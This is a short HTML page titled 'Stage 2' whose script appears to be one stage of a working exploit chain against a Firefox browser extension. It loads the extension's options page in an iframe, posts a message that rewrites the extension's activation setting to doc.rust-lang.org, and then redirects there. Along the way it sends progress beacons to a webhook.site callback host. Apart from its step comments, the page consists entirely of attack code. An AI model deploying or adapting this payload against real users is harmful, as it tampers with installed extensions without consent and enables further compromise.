<!DOCTYPE html>
<html>
<head><title>Stage 2</title></head>
<body>
  <script>
    async function run() {
      fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=2_arrived');

      // 1. Give cs.js 3 seconds to run, trigger the SW import, and send message to background
      await new Promise(r => setTimeout(r, 3000));

      // 2. Open options iframe and reset activateOn
      const iframe = document.createElement('iframe');
      iframe.src = 'moz-extension://09a6c422-a354-447d-b4ea-185cb10be869/options.html';
      document.body.appendChild(iframe);

      iframe.onload = () => {
        iframe.contentWindow.postMessage({
          activateOn: 'https://doc.rust-lang.org/',
          href: 'https://doc.rust-lang.org/'
        }, '*');

        fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=redirecting_to_target');

        // 3. Wait 2 full seconds for background.js to commit storage before navigating
        setTimeout(() => {
          window.location.href = 'https://doc.rust-lang.org/stable/std/';
        }, 2000);
      };
    }
    run();
  </script>
</body>
</html>
